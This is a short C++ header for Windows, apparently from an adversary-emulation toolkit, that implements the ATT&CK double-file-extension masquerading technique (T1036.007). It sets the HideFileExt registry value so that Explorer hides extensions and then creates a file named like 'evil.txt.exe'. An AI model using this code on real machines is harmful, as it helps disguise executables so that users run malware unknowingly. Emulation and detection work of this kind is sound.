#pragma once

#include <Windows.h>
#include <string>

#include "file_util.h"

namespace win{

	//T1036.007
	DWORD DobuleFileExtension(const std::wstring file_path) {
		
		// trun off the file explorer's file extension view setting
		HKEY hKey;
		DWORD value = 1;

		const std::wstring registry_path = L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
		const std::wstring registry_value = L"HideFileExt";
		
		::RegOpenKeyExW(HKEY_CURRENT_USER, registry_path.c_str(), 0, KEY_SET_VALUE, &hKey);
		::RegSetValueExW(hKey, registry_value.c_str(), 0, REG_DWORD, reinterpret_cast<const BYTE*>(&value), sizeof(value));
		::RegCloseKey(hKey);
		
		//create file like evil.txt.exe
		HANDLE file_handle = nullptr;
		util::CreateDataFile(&file_handle, file_path);

		return ERROR_SUCCESS;
	}



	class Masquerading {

	};


} //namespace win
